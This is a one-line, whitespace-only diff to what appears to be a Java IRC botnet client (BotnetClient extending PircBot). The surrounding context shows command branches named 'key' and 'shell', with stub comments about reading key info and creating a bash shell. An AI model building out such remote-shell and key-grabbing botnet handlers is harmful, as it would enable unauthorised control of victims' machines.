@@ -238,7 +238,7 @@ public class BotnetClient extends PircBot {
 					String command = chat.readLine();
 					if (command.equalsIgnoreCase("key")) {
 						//Read the key info using char.readLine(); 
-						
+						 
 						chat.close();
 					} else if (command.equalsIgnoreCase("shell")) {
 						//Create the bash shell
